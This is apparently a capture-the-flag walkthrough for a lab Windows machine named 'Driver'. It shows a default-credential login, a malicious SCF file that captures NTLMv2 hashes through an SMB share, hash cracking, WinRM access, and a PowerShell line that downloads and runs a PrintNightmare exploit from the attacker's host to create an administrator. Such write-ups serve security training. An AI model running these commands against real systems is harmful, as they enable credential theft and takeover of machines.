![Driver.PNG](/assets/Machines/Easy/Driver/Driver.png)


1. Send an ICMP echo request to machine's IP address.
```bash
┌──(root㉿est)-[/home/kali]
└─| ping -c 2 10.10.11.106
```


2. Scan open ports with **nmap**.
```bash
┌──(root㉿kali)-[/home/kali]
└─| nmap -p- --open -vv -sS --min-rate 5000 -Pn -n 10.10.11.106
```

**Output**
```bash
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
445/tcp  open  microsoft-ds
5985/tcp open  wsman
```

3. Visit web page

![webpage.PNG](/assets/Machines/Easy/Driver/webpage.PNG)

* Try with default credentials `admin:admin` | `root:root` | `admin:root`

4. Correct default credentials are `admin:admin`
![login.PNG](/assets/Machines/Easy/Driver/login.PNG)

5. Visit option **Firmware Updates**, in this case we can upload **scf** file. Visit [this](https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/) and create a malicious file

* The reason to upload malicious scf file is to obtain NTLMv2, in this case we can try to upload an icon in share resource and in the moment when user try to load this icon we can obtain yout hash NTLMv2
  
First, configure a maliciuos file 
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Driver]
└─| cat icon.scf  
[Shell]
Command=2
IconFile=\\<Tun0 IP>\<Folder Share>\pentestlab.ico
[Taskbar]
Command=ToggleDesktop
```

Next, crate a share folder with **impacket-smbserver** 
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Driver]
└─| impacket-smbserver <Name of Folder Share> $(pwd) -smb2support
```

Then, **upload scf file**

![hash.PNG](/assets/Machines/Easy/Driver/hash.PNG)

6. Crack this hash with john
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Driver]
└─| john --show ha                           
tony:liltony:DRIVER:aaaaaaaaa:...
```

7. Validate with **crackmapexec** if previous credentials are valid to connect with **winrm**
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Driver]
└─| crackmapexec winrm 10.10.11.106 -u 'tony' -p 'liltony'
```

**Output**
```bash
SMB         10.10.11.106    5985   DRIVER           [*] Windows 10.0 Build 10240 (name:DRIVER) (domain:DRIVER)
HTTP        10.10.11.106    5985   DRIVER           [*] http://10.10.11.106:5985/wsman
WINRM       10.10.11.106    5985   DRIVER           [+] DRIVER\tony:liltony (Pwn3d!)
```

* The credentials are valid! 


8. Connect with **evil-winrm**
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Driver]
└─| evil-winrm -i 10.10.11.106 -u 'tony' -p 'liltony'
```

**Output**
```cmd
*Evil-WinRM* PS C:\Users\tony\Documents> whoami
driver\tony
```

9. Cat **user flag**
```cmd
*Evil-WinRM* PS C:\Users\tony\Desktop> type user.txt
7a703b72141c5377c70494e7b027e4f6
```

---
---
---
### **Privileges Escalation** 💀

1. Use winPEAS to discover a way for escalate privileges (Use python server and certutil.exe to download winPEAS in target machine)
```bash
*Evil-WinRM* PS C:\Windows\Temp> .\winPEASx64.exe
```

**Output**

![winPEAS.PNG](/assets/Machines/Easy/Driver/winPEAS.PNG)

* Visit [this](https://github.com/calebstewart/CVE-2021-1675) to know function of exploit


2. Download exploit in target machine

First, download exploit in your machine and create a http server with python
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Driver]
└─| python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Then, download this in target machine use **certutil.exe**
```bash
*Evil-WinRM* PS C:\Windows\Temp> IEX(New-Object Net.WebClient).downloadString('http://<tun 0 IP>/exploit.ps1')
```

Next, execute this.
```
Invoke-Nightmare -DriverName "Xerox" -NewUser "<User>" -NewPassword "<Password>" 
```

3. With the credentials you created previously, login with **evil-winrm**
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Driver]
└─| evil-winrm -i 10.10.11.106 -u 'EsTX' -p 'EsTX321'
```
> In my case the credentials are `EsTX:EsTX321`


4. The user created previously is in **Administrators Group**
```cmd
*Evil-WinRM* PS C:\Users\EsTX\Documennet user EsTX


...
Local Group Memberships      *Administrators
...
```

5. Cat **root flag**
```bash
*Evil-WinRM* PS C:\Users\EsTX\Documents> type \Users\Administrator\Desktop\root.txt
428d231f64c7d6b5097366452218d514
```